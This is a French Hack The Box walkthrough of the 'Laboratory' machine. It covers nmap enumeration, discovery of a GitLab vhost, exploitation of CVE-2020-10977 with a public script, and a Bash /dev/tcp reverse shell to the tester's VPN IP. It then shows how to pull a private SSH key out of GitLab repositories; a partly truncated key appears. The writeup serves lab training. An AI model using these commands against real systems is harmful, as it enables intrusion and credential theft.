---

# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Laboratory — HTB Easy Writeup & Walkthrough"
linkTitle: "Laboratory"
slug: "laboratory"
date: 2026-06-25T08:30:00+02:00
#lastmod: 2026-05-29T09:54:27+02:00
draft: false

# --- PaperMod / navigation ---
type: "writeups"
summary: "Laboratory (HTB Easy) : GitLab vulnérable, récupération d’une clé SSH et escalade Linux via SUID et PATH Hijacking."
description: "Writeup de Laboratory (HTB Easy) : exploitation de GitLab, récupération d’une clé SSH et escalade Linux via SUID et PATH Hijacking."
tags: ["Hack The Box","HTB Easy","linux-privesc","Web","GitLab","CVE-2020-10977","RCE","SSH","SUID","PATH Hijacking","Docker"]
categories: ["Mes writeups"]

# Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
# par exemple :
# - prise de pied : "Web", "SSH", "FTP"
# - faille : "XSS", "LFI", "RCE", "Path Traversal", "Shellshock"
# - techno / produit : "Grafana", "Chamilo", "CMS Made Simple", "js2py"
# - CVE : "CVE-2021-43798"
# - pivot : "Credential Reuse"
# - privesc spécifique : "sudo", "Docker", "Cron", "ACL", "PATH Hijacking", "tmux", "npbackup", "pspy64"

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Machine Laboratory HTB Easy exploitée étape par étape via GitLab, clé SSH et escalade Linux par SUID et PATH Hijacking."
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Laboratory"
  difficulty: "Easy"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Vhost Discovery","GitLab","RCE","SSH","SUID","PATH Hijacking","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Laboratory> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

La machine `Laboratory` de Hack The Box, classée HTB Easy, propose un walkthrough Linux centré sur une instance GitLab vulnérable à `CVE-2020-10977`, la découverte d’un vhost et une escalade de privilèges locale. Ce writeup détaille une chaîne d’exploitation complète, depuis l’identification du sous-domaine `git.laboratory.htb` jusqu’à l’obtention d’un accès root.

La prise de pied repose sur GitLab, accessible via le vhost découvert pendant l’énumération web. Après l’exploitation de l’application, l’analyse des dépôts internes permet de retrouver des informations utiles et de pivoter vers l’utilisateur `dexter` en SSH.

L’escalade de privilèges s’appuie ensuite sur l’analyse du binaire SUID `/usr/local/bin/docker-security`. Avec `strace`, tu observes que ce programme appelle `chmod` sans chemin absolu, ce qui permet un détournement du `PATH` et conduit à l’accès root.



## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) montre les ports ouverts suivants :

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/laboratory/full_tcp_scan.txt laboratory.htb
Nmap scan report for laboratory.htb (10.129.x.x)
Host is up (0.088s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 27.00 seconds
```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :

- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans (`scans_nmap/enum_ftp_smb_scan.txt`) :

```bash
# mon-nmap — ENUM FTP / SMB
# Target : laboratory.htb
# Date   : [date]

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80,443
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan fournit des informations détaillées sur les services et versions détectés.

Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour laboratory.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80,443" --script="(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "laboratory.htb"

# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80,443 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/laboratory/aggressive_vuln_scan_raw.txt laboratory.htb
Nmap scan report for laboratory.htb (10.129.x.x)
Host is up (0.039s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Issuer: commonName=laboratory.htb
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-05T10:39:28
| Not valid after:  2024-03-03T10:39:28
| MD5:     2873 91a5 5022 f323 4b95 df98 b61a eb6c
| SHA-1:   0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca
|_SHA-256: e164 6bfd 66bd 8821 2fff 8c99 3c25 bc59 3e85 154e dc00 6551 2015 9530 84da 3aba
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 (91%), Linux 5.14 - 6.8 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.19 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   53.93 ms 10.10.16.1
2   53.98 ms laboratory.htb (10.129.6.88)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 24.88 seconds

```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80,443 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/laboratory/cms_vuln_scan.txt laboratory.htb
Nmap scan report for laboratory.htb (10.129.x.x)
Host is up (0.063s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
|_http-title: Did not follow redirect to https://laboratory.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-sitemap-generator: 
|   Directory structure:
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    
| http-headers: 
|   Date: Fri, 29 May 2026 08:10:55 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Location: https://laboratory.htb/
|   Content-Length: 287
|   Connection: close
|   Content-Type: text/html; charset=iso-8859-1
|   
|_  (Request type: GET)
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
443/tcp open  ssl/http Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| http-headers: 
|   Date: Fri, 29 May 2026 08:10:55 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Last-Modified: Sun, 05 Jul 2020 16:42:54 GMT
|   ETag: "1c56-5a9b4731c5f80"
|   Accept-Ranges: bytes
|   Content-Length: 7254
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
| http-enum: 
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; html: 1
|     /assets/
|       Other: 1
|     /assets/css/
|       css: 1
|     /assets/js/
|       Other: 1; js: 5
|     /icons/
|       gif: 1
|     /images/
|       jpg: 2; mp4: 1; png: 1
|   Longest directory structure:
|     Depth: 2
|     Dir: /assets/js/
|   Total files found (by extension):
|_    Other: 3; css: 1; gif: 1; html: 1; jpg: 2; js: 5; mp4: 1; png: 1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 32.53 seconds

```



### Scan UDP rapide

Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/laboratory/udp_vuln_scan.txt laboratory.htb
Nmap scan report for laboratory.htb (10.129.x.x)
Host is up.

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 3.11 seconds

```



### Énumération des chemins web
Pour la découverte des chemins web, tu utilises généralement le script dédié {{< script "mon-recoweb" >}}.

Les résultats de `mon-recoweb` ne sont pas exploitables ici, car le serveur retourne massivement des réponses HTTP `302`.

Une réponse `302` indique une redirection. Or, si presque tous les chemins testés sont redirigés, il devient impossible de distinguer proprement un vrai répertoire d’un faux positif.

Le test avec `--fc 302` confirme ce comportement : une fois les redirections exclues, le résultat devient vide. Les résultats précédents correspondent donc principalement à des redirections, et non à des chemins web distincts clairement identifiables.

Dans ce contexte, `mon-recoweb` n’apporte donc pas de découverte web fiable.

### Recherche de vhosts

Pour compléter l’énumération web, tu recherches ensuite d’éventuels virtual hosts avec le script dédié {{< script "mon-subdomains" >}}.

Le résultat n’est toutefois pas exploitable directement.

Sur le port `80`, les baselines effectuées avec des noms d’hôtes aléatoires retournent toutes une réponse `302` identique. Le fuzzing remonte alors presque toute la wordlist comme résultat potentiel, ce qui correspond à des faux positifs.

Sur le port `443`, les noms d’hôtes aléatoires retournent tous une réponse `200` identique, avec la même taille et le même nombre de mots. Le script détecte donc un comportement de type wildcard et saute le fuzzing, car la réponse ne permet pas de distinguer un vrai virtual host d’un nom inventé.

Dans ce contexte, `mon-subdomains` ne permet pas d’identifier de virtual host fiable.

## Prise pied

Le scan agressif fournit deux informations utiles pour orienter la prise pied :

```bash
| http-enum:
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /assets/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

| ssl-cert:
| Subject Alternative Name:
|   DNS:git.laboratory.htb

```

Les répertoires `/images` et `/assets` peuvent être explorés, mais l’information la plus importante ici est la présence d’un vhost HTTPS :

```url
https://git.laboratory.htb
```

Avant de poursuivre, tu vérifies que l’interface GitLab répond correctement. Sur cette machine, l’application n’est pas toujours immédiatement disponible : tant que le service n’est pas complètement prêt, GitLab retourne une erreur `502`.

Tu utilises donc une petite boucle `curl` pour tester régulièrement la réponse de `https://git.laboratory.htb/`. La commande affiche le code HTTP, extrait le titre de la page lorsqu’il est présent, puis s’arrête dès que GitLab ne répond plus en `502` ou en `000`.



```bash
while true; do
  code=$(curl -k -s -o /tmp/gitlab-check.html -w "%{http_code}" https://git.laboratory.htb/)
  title=$(grep -oP '(?<=<title>).*?(?=</title>)' /tmp/gitlab-check.html 2>/dev/null)

  echo "$(date '+%H:%M:%S') - HTTP $code - ${title:-no title}"

  if [ "$code" != "502" ] && [ "$code" != "000" ]; then
    echo "[+] GitLab semble répondre : https://git.laboratory.htb/"
    break
  fi

  sleep 30
done
```

Hack The Box indique que le service GitLab peut prendre jusqu’à 5 minutes avant d’être pleinement disponible. Il est donc normal d’obtenir temporairement des erreurs `502` après un reset de la machine.

![Page GitLab affichant une erreur 502 pendant le démarrage du service GitLab sur Laboratory HTB](gitlab-502.png)

Voici par exemple une attente typique avant que GitLab réponde correctement :

```text
17:38:12 - HTTP 000 - GitLab is not responding (502)
17:38:45 - HTTP 000 - GitLab is not responding (502)
17:39:08 - HTTP 000 - GitLab is not responding (502)
17:39:38 - HTTP 502 - GitLab is not responding (502)
17:39:58 - HTTP 502 - GitLab is not responding (502)
17:41:19 - HTTP 502 - GitLab is not responding (502)
17:41:49 - HTTP 302 - no title
[+] GitLab semble répondre : https://git.laboratory.htb/
```

Ici, le passage en `HTTP 302` indique que le service répond à nouveau. Tu peux alors poursuivre l’exploitation de `https://git.laboratory.htb/`.

![Page de connexion GitLab Community Edition disponible sur le vhost git.laboratory.htb](gitlab-login.png)

> Si GitLab ne répond toujours pas après environ 5 à 6 minutes, le plus simple est de faire un reset de la machine. Dans ce cas, pense aussi à mettre à jour `/etc/hosts` avec la nouvelle adresse IP attribuée par Hack The Box.

### Exploration de l’interface GitLab

Une fois GitLab disponible, tu peux ouvrir l’interface web sur `https://git.laboratory.htb/`.

Le certificat HTTPS étant auto-signé, le navigateur affiche d’abord un avertissement de sécurité. Pour poursuivre l’exploration de la machine, tu acceptes l’exception et tu accèdes à l’application.



<img  src="gitlab-accept-self-signed-certificate.png"  alt="Avertissement du navigateur lié au certificat auto-signé de git.laboratory.htb"  class="img-left-60">



La page d’accueil de GitLab permet de créer un compte utilisateur. Tu utilises donc la fonctionnalité d’enregistrement proposée par l’application.

![Formulaire d’enregistrement GitLab sur git.laboratory.htb](gitlab-register.png)

Une fois connecté, tu arrives sur le tableau de bord GitLab.

![Tableau de bord GitLab après connexion](gitlab-dashboard.png)

### Recherche de la version de GitLab

Avant de chercher une vulnérabilité exploitable, tu récupères la version exacte de GitLab installée sur la machine.

Depuis l’interface web, tu ouvres le menu utilisateur en haut à droite, puis tu cliques sur **Help**.

![Menu utilisateur GitLab avec accès à la page Help](gitlab-help.png)

La page d’aide affiche la version de l’application : **GitLab Community Edition 12.8.1**.

![Page Help affichant la version GitLab Community Edition 12.8.1](gitlab-version.png)

Cette information est importante pour la suite, car elle permet de cibler les recherches sur les vulnérabilités connues affectant cette version précise de GitLab.

À ce stade, tu peux soit explorer l’interface web manuellement, soit chercher si l’instance GitLab présente une vulnérabilité exploitable. 

Dans ce writeup, tu vas privilégier la recherche de vulnérabilités connues. Ce choix est logique ici, car GitLab est une application complexe, régulièrement ciblée dans des environnements CTF, et dont certaines versions ont connu des failles critiques exploitables à distance. Cela permet de vérifier rapidement si le service exposé présente une piste d’exploitation directe.

### Recherche d’un exploit public

L’idéal serait de trouver une vulnérabilité **RCE** compatible avec GitLab `12.8.1`, qui te permettrait d’exécuter une commande lançant un reverse shell vers Kali.

Tu peux par exemple lancer une recherche Google avec les termes suivants :

```text
gitlab vulnerabilities 12.8.1 reverse shell github poc -laboratory
```

Le terme `-laboratory` est volontaire : il permet d’exclure les résultats contenant le nom de la machine, afin d’éviter les writeups ou solutions déjà publiés pour ce challenge.

![Recherche Google d’une vulnérabilité RCE pour GitLab 12.8.1 pouvant permettre l’exécution d’un reverse shell, avec le terme -laboratory pour exclure les writeups du challenge](gitlab-google-reverse-shell-search.png)

La recherche fait ressortir un dépôt GitHub `gitlab-cve-2020-10977`, dont la description mentionne une exécution de code à distance contre GitLab Community Edition et Enterprise Edition.

```url
https://github.com/vandycknick/gitlab-cve-2020-10977
```

À ce stade, l’objectif est donc de vérifier si cette vulnérabilité peut s’appliquer à notre version `12.8.1` observée sur la cible, puis de comprendre son fonctionnement avant de l’utiliser.

### Exploitation de gitlab-cve-2020-10977

La recherche précédente permet d’identifier un dépôt GitHub proposant un exploit pour `gitlab-cve-2020-10977`. L’exploit nécessite un compte GitLab valide, ce qui correspond à la situation actuelle puisque tu as pu créer un compte sur l’interface web.

#### Clonage sur Kali

Sur Kali, tu clones le dépôt contenant le script d’exploitation :

```bash
git clone https://github.com/vandycknick/gitlab-cve-2020-10977.git
cd gitlab-cve-2020-10977
```

L’exploit utilise les modules Python `requests` et `beautifulsoup4`. Sur Kali, tu peux vérifier leur présence ou les installer avec la recette dédiée :

{{< recette "installation-modules-python3-kali" >}}

```bash
pip3 install requests beautifulsoup4 --break-system-packages
```

#### Test de l’exploit

Avant de lancer l’exploit directement, tu affiches son aide afin de vérifier les options disponibles :

```bash
python3 cve_2020_10977.py -h
```

Ce qui te donne :

```bash
usage: cve_2020_10977.py [-h] --url URL -u USERNAME
                                     -p PASSWORD [--cmd CMD]
                                     [--insecure]

options:
  -h, --help            show this help message and exit
  --url URL             Target URL
  -u, --username USERNAME
                        Gitlab username
  -p, --password PASSWORD
                        Gitlab password
  --cmd CMD             Command to execute
  --insecure            Allow insecure server connections when using
                        SSL

```

Le script attend notamment l’URL de la cible, un nom d’utilisateur GitLab, un mot de passe, ainsi qu’une commande optionnelle à exécuter.

Les options `-u` et `-p` correspondent aux identifiants du compte GitLab créé précédemment depuis la page d’enregistrement de l’application web. Ici, tu réutilises donc le compte créé précédemment, par exemple `noelnac`, avec le mot de passe défini lors de l’inscription.

L’option `--cmd` est particulièrement intéressante, car elle permet d’indiquer la commande à exécuter sur la cible. C’est ce mécanisme qui pourra ensuite servir à lancer un reverse shell vers Kali.

L’option `--insecure` est importante ici, car elle permet de lancer l’exploit malgré le certificat self-signed présenté par l’instance GitLab.

#### Premier test sans commande

Avant de tenter un reverse shell, tu peux lancer l’exploit sans option `--cmd`. Cela permet de vérifier que le script fonctionne correctement avec l’URL cible, le compte GitLab créé précédemment et le certificat self-signed.

```bash
python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p 'Password123!' --insecure
```

Le script se connecte à GitLab, crée deux projets temporaires, crée une issue, puis la déplace d’un projet vers l’autre. Ce mécanisme est utilisé pour exploiter la vulnérabilité et lire un fichier sensible de l’installation GitLab.

```bash
[INFO] Logging into Gitlab ...
[INFO] Login Successfull!
[INFO] Creating project 607da931-aeda-4f6a-8a30-1af48a5eb853
[INFO] Creating project f11713fc-c19c-40d4-b468-72f55252f581
[INFO] Creating issue 166c3322-bba0-497b-b193-217c134fc705 in project 607da931-aeda-4f6a-8a30-1af48a5eb853
[INFO] Moving issue 166c3322-bba0-497b-b193-217c134fc705 from project 607da931-aeda-4f6a-8a30-1af48a5eb853 to f11713fc-c19c-40d4-b468-72f55252f581
[INFO] Extracting secret from file
[INFO] GitLab Secret: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
```

Le message de succès de connexion confirme que les identifiants GitLab sont valides.

À ce stade, tu sais donc que l’exploit est fonctionnel. Tu peux maintenant passer à l’exécution d’une commande avec l’option `--cmd`.

#### Validation de l’exécution de commande

Avant de lancer un reverse shell, tu peux faire un test plus simple avec `wget`. L’idée est de demander à la cible de récupérer un fichier hébergé sur ta machine Kali. Si Kali reçoit la requête HTTP, cela confirme que la commande fournie à l’option `--cmd` est bien exécutée sur la cible.

Sur Kali, tu crées d’abord un petit fichier de test :

```bash
echo "poc command execution" > test.txt
```

Puis tu lances un serveur HTTP dans le même répertoire :

```bash
python3 -m http.server 8000
```

Ensuite, tu relances l’exploit en ajoutant une commande `wget` :

```bash
python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p 'Password123!' --insecure --cmd "wget http://10.10.16.20:8000/test.txt" 
```

Si l’exécution de commande fonctionne, le serveur HTTP lancé sur Kali reçoit une requête depuis la cible :

```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.8.117 - - [01/Jun/2026 16:57:39] "GET /test.txt HTTP/1.1" 200 -
```

Ce test confirme que l’exploit permet bien d’exécuter une commande sur la machine cible. Tu peux maintenant remplacer la commande `wget` par une commande destinée à établir un reverse shell vers Kali.

#### Obtention du reverse shell

Après avoir validé l’exécution de commande avec `wget`, tu peux remplacer la commande de test par un reverse shell Bash.

Sur Kali, tu commences par ouvrir un listener Netcat :

```bash
rlwrap nc -lvnp 4444
```

Tu relances ensuite l’exploit en utilisant l’option `--cmd` pour exécuter un reverse shell vers ton IP VPN HTB :

```bash
python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p 'Password123!' --insecure --cmd "bash -c 'bash -i >& /dev/tcp/10.10.16.20/4444 0>&1'"
```

Dans cette commande, l’exploit se connecte à GitLab avec le compte créé précédemment, puis utilise l’exécution de commande pour lancer un shell Bash vers Kali.

Si tout se passe correctement, le listener reçoit une connexion entrante :

```bash
listening on [any] 4444 ...
connect to [10.10.16.20] from (UNKNOWN) [10.129.8.117] 35368
bash: cannot set terminal process group (413): Inappropriate ioctl for device
bash: no job control in this shell
git@git:~/gitlab-rails/working$ 
```

Tu obtiens alors un shell en tant qu’utilisateur `git`, dans le contexte de l’installation GitLab.

#### Stabilisation du shell

Le reverse shell obtenu fonctionne, mais il reste peu confortable pour poursuivre l’exploitation. Tu peux donc le stabiliser avec la méthode classique déjà présentée dans la recette dédiée : {{< recette "stabiliser-reverse-shell" >}}

Tu commences par obtenir un pseudo-terminal avec Python :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Tu suspends ensuite le shell avec `Ctrl+Z`, puis tu configures ton terminal local sur Kali :

```bash
stty raw -echo; fg
```

Après le retour dans le shell distant, tu appuies une fois sur `Entrée`, puis tu définis quelques variables utiles :

```bash
export TERM=xterm
stty rows 40 columns 120
```

Tu disposes maintenant d’un shell plus confortable pour explorer l’installation GitLab depuis le compte `git`.

### Analyse des dépôts GitLab

Le reverse shell obtenu te donne un accès en tant qu’utilisateur `git`, c’est-à-dire l’utilisateur système utilisé par GitLab pour faire fonctionner l’application.

Tu peux commencer par vérifier le contexte courant :

```bash
cd ~
whoami
id
hostname
pwd
```

Le shell confirme que tu te trouves dans le contexte applicatif de GitLab :

```bash
git@git:~$ whoami
git

git@git:~$ id
uid=998(git) gid=998(git) groups=998(git)

git@git:~$ hostname
git.laboratory.htb

git@git:~$ pwd
/var/opt/gitlab
```

À ce stade, l’objectif est de comprendre ce que cet utilisateur peut lire dans l’installation GitLab. 

#### Recherche des repositories

Comme GitLab héberge des dépôts Git, tu peux rechercher l’emplacement des répertoires appelés `repositories` :

```bash
find / -type d -name repositories 2>/dev/null
```

Sur cette machine, la commande permet d’identifier l’emplacement des dépôts GitLab :

```text
/var/opt/gitlab/git-data/repositories
```

Tu recherches ensuite les dépôts Git présents dans cette arborescence :

```bash
find /var/opt/gitlab/git-data/repositories -type d -name "*.git" 2>/dev/null
```

La recherche retourne plusieurs dépôts :

```bash
/var/opt/gitlab/git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.wiki.git
/var/opt/gitlab/git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
/var/opt/gitlab/git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.wiki.git
/var/opt/gitlab/git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git
```

#### Lecture des repositories

Ces chemins correspondent à des dépôts Git bare utilisés par GitLab. Ils contiennent bien les fichiers du projet, mais pas sous forme d’arborescence directement lisible avec `ls`.

Pour les afficher, tu dois interroger le dépôt avec Git, en utilisant l’option `--git-dir`.

Par exemple, sur le premier dépôt non-wiki :

```bash
git --git-dir=/var/opt/gitlab/git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git \
  ls-tree -r HEAD --name-only
```

La liste des fichiers montre notamment un répertoire `.ssh` associé à l’utilisateur `dexter` :

```txt
README.md
create_gitlab.sh
dexter/.ssh/authorized_keys
dexter/.ssh/id_rsa
dexter/recipe.url
dexter/todo.txt
```

#### Extraction de la clé SSH de dexter

Le fichier le plus sensible est `dexter/.ssh/id_rsa`, car il correspond à une clé privée SSH. Si cette clé est acceptée par le service SSH, elle peut permettre une connexion au compte système `dexter`.

Tu peux extraire cette clé directement depuis le dépôt avec `git show` :

```bash
git --git-dir=/var/opt/gitlab/git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git show HEAD:dexter/.ssh/id_rsa
```

Sur Kali, tu crées ensuite un fichier local et tu y colles le contenu complet de la clé privée :

```bash
nano dexter_id_rsa
```

La clé doit être copiée entièrement, depuis la ligne `-----BEGIN OPENSSH PRIVATE KEY-----` jusqu’à la ligne `-----END OPENSSH PRIVATE KEY-----`.

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNUgCCt
oSE+v8sPNaB/xF0CVqQHtnhnWe6ndxXWHwb34UTodq6g2nOlvtOQ9ITxSevDScM/ctI6h4
2dFBhs+8cW9uSxOwlFR4b70E+tv3BM3WoWgwpXvguP2uZF4SUNWK/8ds9TxYW6C1WkAC8Z

[contenu volontairement tronqué]

